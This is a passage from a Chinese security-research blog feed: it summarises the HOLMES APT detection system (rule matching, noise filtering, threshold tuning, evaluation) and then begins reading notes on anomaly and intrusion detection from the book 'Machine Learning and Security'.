encoding="application/x-tex">S_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>分别表示步骤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的权重和威胁程度,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>表示阈值。如果在步骤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>中没有TTP出现，我们将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>设置为1.</p><h1 id="4-系统实施"><a class="markdownIt-Anchor" href="#4-系统实施"></a> 4 系统实施</h1><p>下图是整个HOLMES系统的架构</p><p><img src="https://img-blog.csdnimg.cn/20200115205505462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="41-构建起源图的流消耗"><a class="markdownIt-Anchor" href="#41-构建起源图的流消耗"></a> 4.1 构建起源图的流消耗</h2><p>为了实现平台的独立性，来自不同操作系统的审计数据被规范化为通用数据表示（common data representation, CDR）。为基于CDR的审计记录发布到流处理服务器（Kafka），并从流服务器消费来进行实时分析和检测。使用SLEUTH系统进行数据流消耗，因果关系跟踪和起源图构造。</p><h2 id="42-规则匹配引擎和hsg构建"><a class="markdownIt-Anchor" href="#42-规则匹配引擎和hsg构建"></a> 4.2 规则匹配引擎和HSG构建</h2><p>规则匹配引擎在<strong>起源图上进行操作</strong>，并且将TTP规则作为输入。论文中用到的TTP规则在Table8中展示。为了匹配到一个TTP，规则匹配引擎将规则表中的每一条规则和它的先决条件进行迭代。这个环节的主要挑战是：对于每一个TTP来说，都要检查之前匹配的TTPs的先决条件和他们之间的路径因子。</p><p>为了避免大量的计算，我们不使用回溯法而是使用<strong>增量匹配法</strong>。这种方法存储先前计算的结果，并沿着图匹配和传播指向这些结果的指针。当一个TTP被匹配时，我们在HSG中创建相应的节点，并创建一个指向该节点的指针。同时这个指针将会指向所有与该TTP有依赖关系的低级别实体。</p><p>例如path_factor的计算，假设N1（起源图中的实体）和N2、N1和N3之间已经建立了依赖，当节点N2与N3之间出现了信息流时，  我们需要重新计算N1和N3之间的path_factor，以取path_factor的最小值。计算的过程中之前N1和N2的计算结果便可复用。</p><p>这种基于指针的两层之间的关联方法可能存在开销和复杂性较大的问题。但实际情况是，大量的低级别实体指向一个TTP，每个低级别实体只有一个指向TTP的指针，而每个TTP有多个维护多个指向它的指针，因此并没有出现随着起源图的增加而开销和复杂度急剧提升的情况</p><h2 id="43-噪声过滤和检测引擎"><a class="markdownIt-Anchor" href="#43-噪声过滤和检测引擎"></a> 4.3 噪声过滤和检测引擎</h2><p>噪声过滤引擎识别的是良性的TTP匹配，所以它被排除在HSG之外。它以从正常行为中学习到的模型为输入，模型包含了与良性活动匹配的TTPs以及从操作系统中读写操作的字节数阈值。</p><p>当规则匹配系统匹配到一个TTP时，他的入口和先决条件就会在这个模型中搜索，如果在模型中存在一个入口包含了所有的先决条件和匹配事件，那么所有的被转移的字节数就会与良性阈值进行比对。低于良性阈值该TTP则被过滤，否则在HSG中创建一个该TTP对应的节点。最后检测引擎计算不同HSGs的“权重和”，当其超过检测阈值时，就发出警报。</p><h1 id="5-实验评估"><a class="markdownIt-Anchor" href="#5-实验评估"></a> 5 实验评估</h1><p>实验评估是在由DARPA组织的红蓝对抗中完成的，通过评估计算出HOLMES最佳的阈值，并衡量HOLMES的表现。最终，将HOLMES部署在真实环境中，在没有先验知识的情况下来检测红队的APT攻击。</p><h2 id="51-数据"><a class="markdownIt-Anchor" href="#51-数据"></a> 5.1 数据</h2><p>评估所用的数据总结为下表，其中包含了7台主机的9个APT攻击场景，时间跨度为20天，其中包含了攻击数据和良性数据，攻击数据在数据总量中少于0.001%。</p><p><img src="https://img-blog.csdnimg.cn/20200115205524366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="52-设定"><a class="markdownIt-Anchor" href="#52-设定"></a> 5.2 设定</h2><p>在行动之前，每个主机都有一些接下来会被攻击者利用的漏洞软件。为了进一步混合正常日志和攻击日志，红队同时也会进行良性的活动。</p><p>HOLMES会订阅7个Kafka的topics（每个主机一个topics）来消耗数据流以进行实时地分析和预测。为TTPs的先决条件设置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>t</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>t</mi><mi>h</mi><mi>r</mi><mi>e</mi><mi>s</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">path\_thres=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>(与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>t</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>f</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">path\_factor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>相比较的量)，设置APT阶段<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的权重<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo>=</mo><mo stretchy="false">(</mo><mn>10</mn><mo>+</mo><mi>i</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">weight=(10+i)/10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">1</span><span class="mord">0</span></span></span></span></p><h2 id="53-结果简述"><a class="markdownIt-Anchor" href="#53-结果简述"></a> 5.3 结果简述</h2><p>检测结果如下表所示，注意到最高的良性活动分数是良性活动中最高的威胁分数：</p><p><img src="https://img-blog.csdnimg.cn/20200115205535973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>概念：</p><ul><li><strong>n-th percentile（第n百分位数，10≤n≤90）</strong>：小明在一次考试中得了50分，而全班有70%的同学的成绩都小于50分，那么对于由整个班级的考试成绩所构成的一个样本集合来说，第70百分位数等于50。</li><li><strong>n-th quartile（第n四分位数，1≤n≤3）</strong>：把所有数据由小到大排列并分成四等份，处于三个分割点位置的数据就是四分位数。<ul><li>第一四分位数 (Q1)，又称“下四分位数”，等于该样本中所有数据由小到大排列后第25%的数据</li><li>第二四分位数 (Q2)，又称“中位数”，等于该样本中所有数据由小到大排列后第50%数据。</li><li>第三四分位数 (Q3)，又称“上四分位数”，等于该样本中所有数据由小到大排列后第75%的数据。</li><li>第三四分位数与第一四分位数的差距又称四分位距（InterQuartile Range, IQR）。</li></ul></li></ul><h2 id="54-寻找最优阈值"><a class="markdownIt-Anchor" href="#54-寻找最优阈值"></a> 5.4 寻找最优阈值</h2><p>如下图所示，使用准确率和召回率来寻找最佳阈值。其中F-score表示准确率和召回率的调和平均值，注意到在[338.25, 608.26]时，F-score达到最大，区间的两个端点分别表示良性活动的最高分数和恶意活动的最小分数，因此阈值应该在该区间内选取</p><p>如何确定最终的阈值呢？</p><p>我们首先将Threat Tuple的Threat scores开n次方根得到一个数，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mn>7</mn></msubsup><msub><mi>w</mi><mi>i</mi></msub><mo>=</mo><mn>1.1</mn><mo>+</mo><mn>1.2</mn><mo>+</mo><mn>1.3</mn><mo>+</mo><mn>1.4</mn><mo>+</mo><mn>1.5</mn><mo>+</mo><mn>1.6</mn><mo>+</mo><mn>1.7</mn><mo>=</mo><mn>9.8</mn></mrow><annotation encoding="application/x-tex">n=\sum_{i=1}^{7}w_{i}=1.1+1.2+1.3+1.4+1.5+1.6+1.7=9.8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.253718em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord">.</span><span class="mord">8</span></span></span></span>。我们称这个数为<strong>平均严重程度</strong>，它反映了每一个APT阶段对threat score总分的贡献值。但是到目前为止我们仅考虑了单个主机上的行为，因此将横向移动阶段<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">w_{5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>排除在外，因此<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mn>1.1</mn><mo>+</mo><mn>1.2</mn><mo>+</mo><mn>1.3</mn><mo>+</mo><mn>1.4</mn><mo>+</mo><mn>1.6</mn><mo>+</mo><mn>1.7</mn><mo>=</mo><mn>8.3</mn></mrow><annotation encoding="application/x-tex">n=1.1+1.2+1.3+1.4+1.6+1.7=8.3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">.</span><span class="mord">3</span></span></span></span>。</p><p>在取n次方根之后我们发现，F-score取得最大值时，在[338.25, 608.26]之间调整阈值获得不同的threat scores，此时对应平均严重程度的收敛区间为[2.01, 2.16]，我们取其中位数2.09.<br /><img src="https://img-blog.csdnimg.cn/20200115205548592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="55-性能"><a class="markdownIt-Anchor" href="#55-性能"></a> 5.5 性能</h2><p>（1）<strong>图大小</strong>：在从起源图到HSG的映射过程中，边的数量减少了1875倍。</p><h2 id="56-真实实验"><a class="markdownIt-Anchor" href="#56-真实实验"></a> 5.6 真实实验</h2><p>将系统放在模拟的企业环境中，在对攻击没有先验知识的情况下，由红队发起APT攻击。将检测的阈值设置为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2.0</mn><msup><mn>9</mn><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mn>7</mn></msubsup><msub><mi>w</mi><mi>i</mi></msub></mrow></msup><mo>=</mo><mn>2.0</mn><msup><mn>9</mn><mn>9.8</mn></msup><mo>=</mo><mn>1378.</mn></mrow><annotation encoding="application/x-tex">2.09^{\sum_{i=1}^{7} w_{i}}=2.09^{9.8}=1378 .</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.98692em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">0</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.98692em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">0</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span><span class="mord mtight">.</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">7</span><span class="mord">8</span><span class="mord">.</span></span></span></span></p><p>（1）误报（False Positive）</p><p>将系统放在两周的良性活动环境中，没有发现误报</p><p>（2）漏报（False Negative）</p><ul><li>TTP之间的隐式因果关系：对于避免系统调用的信息流，HOLMES无法直接查看系统实体之间的因果关系。 但是，如果攻击的其余部分通过系统调用展开，则HOLMES仍将重构部分攻击。</li><li>多个入口点：作为一种主动规避技术，攻击者可能会利用多个入口点来生成分离的子图。 HOLMES会跟踪每个单独的入口点，直到满足我们的检测阈值为止，并且当不相交的子图之间存在信息流时，它们会关联TTP。 但是，可能需要一些其他分析来完全关联攻击步骤，这些攻击步骤来自不同的入口点，并且之间没有信息流。</li></ul><h1 id="6-相关研究"><a class="markdownIt-Anchor" href="#6-相关研究"></a> 6 相关研究</h1><h2 id="61-报警生成"><a class="markdownIt-Anchor" href="#61-报警生成"></a> 6.1 报警生成</h2><p>基于主机的入侵检测方法主要分为以下三类：</p><p>(1)misuse-based  ：检测与已知攻击相关的行为</p><p>(2)anomaly-based  ：从正常行为中学习模式，并检测偏离该模式的行为</p><p>(3)specification-based   ：根据专家指定的策略检测攻击</p><p>本文属于misuse-based，但是，本文的方法超越了传统的误用检测，它使用了<strong>先决条件-结果</strong>的模式，当匹配的TTP中涉及的实体之间存在信息流依赖性时，这些<strong>先决条件-结果</strong>模式将被匹配。</p><h2 id="62-报警关联"><a class="markdownIt-Anchor" href="#62-报警关联"></a> 6.2 报警关联</h2><p>IDS生的成警报对于人工操作员而言太多且级别很低。 需要开发一些技术来总结这些低级别警报并减少其数量。</p><p>一些方法使用警报相关性，通过对相似警报进行聚类并确定警报之间的因果关系来执行检测。目前的方法依赖运行在用户空间的第三方应用生成的日志，而且基于像时间戳之类的统计特征，这样并不能很好的检测时间跨度很长的APT攻击。因此HOLMES在不同的攻击步骤之间建立了信息流，使用了内核审计数据。</p><p>警报关联的另一项工作依赖于警报在时间上的接近程度。 相比之下，HOLMES依靠信息流和因果关系来关联警报，因此即使在执行步骤非常缓慢的情况下，也能够检测到攻击。</p><h2 id="63-场景重建"><a class="markdownIt-Anchor" href="#63-场景重建"></a> 6.3 场景重建</h2><p>许多研究是基于生成和使用<strong>系统调用级别的日志</strong>来进行的。大多数的方法是从一个给定的恶意事件开始去追溯导致该事件的原因。</p><h2 id="64-攻击粒度"><a class="markdownIt-Anchor" href="#64-攻击粒度"></a> 6.4 攻击粒度</h2><p>有时，审计日志的粗粒度会限制对信息流的推理。例如，如果具有之前加载过敏感文件的进程受到攻击，则攻击者可以在不使用系统调用的情况下在其内存区域内搜索敏感内容。HOLMES会将该文件窃取行为与该进程的其他动作相关联，比如敏感文件读取。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《机器学习与安全》读书笔记</title>
      <link href="/2020/02/21/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/02/21/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近看了一本《Machine Learning and Security》的翻译版，原书应该是安全数据科学领域一本比较不错的而且较为基础的书，奈何翻译的太差而且本人水平有限，对书中的许多内容了解的不多，而且书中的代码部分并没有自己亲自实现，只是选取了安全领域的异常检测、恶意软件分析和网络流量分析三个部分做了笔记。希望在学习一段时间之后，能够对之前不了解的内容有所掌握，并且实现一下书中的实战部分。另外如果再读此书的话，一定要读英文版。</p><h1 id="1-异常检测"><a class="markdownIt-Anchor" href="#1-异常检测"></a> 1 异常检测</h1><p>（1）AI for security分为两类：模式识别和异常检测</p><ul><li>模式识别：发现数据中的特性，将其提炼成特征集</li><li>异常检测：建立一个描述正常状态的特征，所有偏离该状态的情况都被视为异常</li></ul><p>（2）shell命令可以形成一个时间序列，因此可以从时间序列分析的角度进行异常检测</p><p>（3）主机入侵检测</p><ul><li>工具框架：osquery（收集低层级OS Metics，可以使用基于SQL的接口进行查询）、Linux auditd</li><li>可以利用第三方工具将上述两种工具集成到自动化业务流程框架中，如：Chef、Puppet、 Ansible、SaltStack、Kolide、doorman</li><li>Indicator Of Compromise</li></ul><p>（4）网络入侵检测</p><ul><li>流量分析工具：tcpdump、Bro、Snort</li><li>检测单位是流量</li><li>提取网络流量元数据<ul><li>基于状态数据包检测（stateful packet inspection，SPI）</li><li>工作在3、4层</li><li>检查数据包的头尾而不触及数据包上下文</li><li>保持先前收到的数据包的状态、从而能够将新接收到的数据包与先前的相关联</li></ul></li><li>检查网络流量内容<ul><li>深度包检测（Deep packet inspection、DPI）</li><li>工作在应用层</li><li>Bro（可以检测HTTP请求POST的字符串，从而可以检测SQL注入和XSS）</li><li>如果要在使用了TLS/SSL加密的环境中进行检测，只能在监测点取消加密</li></ul></li></ul><p>（5）Web应用程序入侵检测</p><ul><li>标准Web服务器以NCSA通用日志格式来生成日志</li></ul><p>（6）异常检测方法——预测（监督学习）</p><ul><li>适用于一维实值度量序列</li><li>思想：将预测与观测之间的偏差视为异常</li><li>ARIMA (autoregressive integrated moving 